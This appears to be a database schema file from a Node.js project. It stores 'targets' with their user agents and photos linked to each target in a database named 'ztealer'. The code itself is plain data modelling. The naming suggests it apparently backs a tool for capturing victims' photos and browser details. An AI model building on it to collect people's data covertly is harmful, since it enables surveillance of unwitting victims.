const mongoose = require('mongoose');
const Schema = mongoose.Schema;
const ObjectId = Schema.ObjectId;
const {db_url}=require('../config')

mongoose.connect('mongodb://'+db_url+'/ztealer')
  .then(() => console.log('Connected!'));

const targetSchema = new Schema({

    userAgent: String,

});
const targetModel = mongoose.model('Target', targetSchema);

const photoSchema = new Schema({

    target_id:{ type: Schema.Types.ObjectId, ref: 'Target'}

});
const photoModel = mongoose.model('Photos', photoSchema);

module.exports={targetModel,photoModel}